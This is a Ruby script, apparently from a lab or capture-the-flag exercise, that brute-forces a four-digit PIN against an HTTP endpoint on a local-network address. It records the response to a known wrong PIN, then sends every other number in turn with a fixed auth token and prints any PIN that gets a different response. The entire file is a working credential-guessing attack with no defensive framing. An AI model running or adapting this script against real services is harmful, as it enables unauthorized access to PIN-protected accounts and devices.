require 'http'

class Request
  @witnessResponse
  @pincode

  def initialize
    @http = HTTP.persistent "http://192.168.1.36:8080"
    @pincode = "1234"
    @witnessResponse = perform(@pincode).to_s
  end

  def perform pincode
    @http.get("/Step1?authtoken=GLI410KCZAsnl&pincode=#{pincode.to_s}")
  end

  def execute
    (9999).times.map do |pincode|
      response = perform(pincode)

      if pincode % 100 == 0
        puts "we are at #{pincode}"
      end

      if compare(response)
        puts pincode
      end

      response.flush
    end
  end

  private

  def compare response
    response.to_s != @witnessResponse
  end
end

request = Request.new

request.execute
